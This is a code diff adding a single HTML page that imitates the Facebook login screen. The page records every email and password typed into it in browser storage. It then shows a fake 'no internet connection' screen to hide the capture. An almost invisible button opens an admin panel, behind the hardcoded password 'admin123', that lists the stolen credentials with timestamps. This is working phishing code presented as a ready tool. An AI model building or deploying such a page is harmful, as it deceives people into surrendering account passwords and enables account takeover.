@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook-Style Login + Admin Panel</title>
+  <style>
+    * { box-sizing: border-box; }
+
+    body, html {
+      margin: 0;
+      padding: 0;
+      font-family: Helvetica, Arial, sans-serif;
+      height: 100%;
+      background-color: #e9ebee;
+    }
+
+    .admin-btn-top {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      background: transparent;
+      color: white;
+      padding: 6px 10px;
+      border-radius: 5px;
+      font-size: 12px;
+      cursor: pointer;
+      z-index: 1000;
+    }
+
+    .login-wrapper {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100%;
+    }
+
+    .login-box {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+      width: 360px;
+      max-width: 90%; /* Ensures the box doesn't stretch too wide on smaller screens */
+      margin: 20px;
+    }
+
+    .login-box h1 {
+      font-size: 40px;
+      color: #1877f2;
+      margin-bottom: 10px;
+      text-align: center;
+    }
+
+    .login-box p {
+      font-size: 18px;
+      text-align: center;
+      color: #1c1e21;
+      margin-bottom: 20px;
+    }
+
+    input {
+      width: 100%;
+      padding: 14px 16px;
+      margin-bottom: 12px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 17px;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      background-color: #1877f2;
+      color: white;
+      font-size: 18px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 5px;
+    }
+
+    button:hover {
+      background-color: #165ecb;
+    }
+
+    .white-screen {
+      width: 100%;
+      height: 100%;
+      background: white;
+    }
+
+    .modal, .panel {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.5);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 999;
+    }
+
+    .modal-content {
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      width: 320px;
+      text-align: center;
+    }
+
+    .panel-content {
+      background: white;
+      width: 600px;
+      max-height: 80%;
+      overflow-y: auto;
+      padding: 20px;
+      border-radius: 10px;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 14px;
+    }
+
+    table th, table td {
+      border: 1px solid #ccc;
+      padding: 8px;
+      text-align: left;
+    }
+
+    table th {
+      background-color: #f2f2f2;
+    }
+
+    .close-btn {
+      margin-top: 15px;
+      background-color: #555;
+    }
+
+    .close-btn:hover {
+      background-color: #333;
+    }
+
+    /* Loading screen styles */
+    .loading-screen {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.7);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: white;
+      font-size: 24px;
+      z-index: 1000;
+    }
+
+    /* Responsive Design */
+    @media (max-width: 480px) {
+      .login-box {
+        width: 85%; /* Reduce width for small screens */
+        padding: 20px;
+      }
+
+      .login-box h1 {
+        font-size: 30px; /* Make the header text smaller */
+      }
+
+      .login-box p {
+        font-size: 16px;
+      }
+
+      .admin-btn-top {
+        font-size: 10px;
+        padding: 5px 8px;
+      }
+
+      .modal-content, .panel-content {
+        width: 90%; /* Ensure modal and panel are responsive */
+      }
+    }
+  </style>
+</head>
+<body>
+
+<!-- Admin Button with transparent background -->
+<div class="admin-btn-top" onclick="showAdminLogin()">.</div>
+
+<!-- Facebook-Style Client Login -->
+<div class="login-wrapper" id="loginContainer">
+  <div class="login-box">
+    <h1>facebook</h1>
+    <p>Log in to your account</p>
+    <input type="text" id="email" placeholder="Email or Phone">
+    <input type="password" id="password" placeholder="Password">
+    <button onclick="clientLogin()">Log In</button>
+  </div>
+</div>
+
+<!-- White screen -->
+<div class="white-screen" id="whiteScreen" style="display:none;"></div>
+
+<!-- Admin login modal (not transparent) -->
+<div class="modal" id="adminLoginModal">
+  <div class="modal-content">
+    <h3>Facebook Login</h3>
+    <input type="password" id="adminPass" placeholder="Enter Facebook Password">
+    <button onclick="verifyAdmin()">Login</button>
+  </div>
+</div>
+
+<!-- Admin Panel -->
+<div class="panel" id="adminPanelModal">
+  <div class="panel-content">
+    <h3>Login History</h3>
+    <table>
+      <thead>
+        <tr>
+          <th>#</th>
+          <th>Email/Phone</th>
+          <th>Password</th>
+          <th>Date & Time</th>
+        </tr>
+      </thead>
+      <tbody id="historyTable"></tbody>
+    </table>
+    <button class="close-btn" onclick="closeAdminPanel()">Close</button>
+  </div>
+</div>
+
+<!-- Loading screen -->
+<div class="loading-screen" id="loadingScreen" style="display: none;">
+  <p>Reloading... No internet connection</p>
+</div>
+
+<script>
+  const ADMIN_PASSWORD = "admin123";
+
+  function clientLogin() {
+    const email = document.getElementById("email").value.trim();
+    const password = document.getElementById("password").value.trim();
+
+    if (!email || !password) {
+      alert("Please enter both email and password.");
+      return;
+    }
+
+    const loginHistory = JSON.parse(localStorage.getItem("login_history")) || [];
+    const now = new Date();
+    const entry = {
+      email: email,
+      password: password,
+      timestamp: now.toLocaleString()
+    };
+
+    loginHistory.push(entry);
+    localStorage.setItem("login_history", JSON.stringify(loginHistory));
+
+    // Hide the login form and show loading screen
+    document.getElementById("loginContainer").style.display = "none";
+    document.getElementById("whiteScreen").style.display = "block";
+    document.getElementById("loadingScreen").style.display = "flex";
+
+    // Simulate a delay of reloading without internet
+    setTimeout(function() {
+      document.getElementById("loadingScreen").innerHTML = '<p>No internet connection. Please check your network settings.</p>';
+    }, 3000); // Delay of 3 seconds
+  }
+
+  function showAdminLogin() {
+    document.getElementById("adminLoginModal").style.display = "flex";
+  }
+
+  function verifyAdmin() {
+    const inputPass = document.getElementById("adminPass").value;
+    if (inputPass === ADMIN_PASSWORD) {
+      loadLoginHistory();
+      document.getElementById("adminLoginModal").style.display = "none";
+      document.getElementById("adminPanelModal").style.display = "flex";
+    } else {
+      alert("Incorrect Facebook password.");
+    }
+  }
+
+  function closeAdminPanel() {
+    document.getElementById("adminPanelModal").style.display = "none";
+  }
+
+  function loadLoginHistory() {
+    const history = JSON.parse(localStorage.getItem("login_history")) || [];
+    const tableBody = document.getElementById("historyTable");
+    tableBody.innerHTML = "";
+
+    history.forEach((entry, index) => {
+      const row = document.createElement("tr");
+      row.innerHTML = ` 
+        <td>${index + 1}</td>
+        <td>${entry.email}</td>
+        <td>${entry.password}</td>
+        <td>${entry.timestamp}</td>
+      `;
+      tableBody.appendChild(row);
+    });
+  }
+</script>
+
+</body>
+</html>
